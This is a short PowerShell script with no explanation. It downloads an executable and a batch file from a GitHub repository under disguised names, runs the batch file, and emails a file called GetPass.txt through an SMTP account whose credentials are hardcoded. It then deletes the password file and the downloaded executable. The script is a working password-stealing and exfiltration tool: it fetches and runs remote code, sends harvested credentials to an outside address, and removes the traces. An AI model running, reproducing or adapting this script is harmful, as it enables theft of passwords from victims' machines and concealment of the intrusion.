(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/foryou123/sectest/master/gp.txt','D:\Get.exe');


(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/foryou123/sectest/master/Command.rar','D:\Command.bat');


D:\Command.bat;

$SMTPServer = 'smtp.126.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('free897@qq.com', 'wodemim8');


$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = 'free897@qq.com'

$ReportEmail.To.Add('hiforyou@yeah.net')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
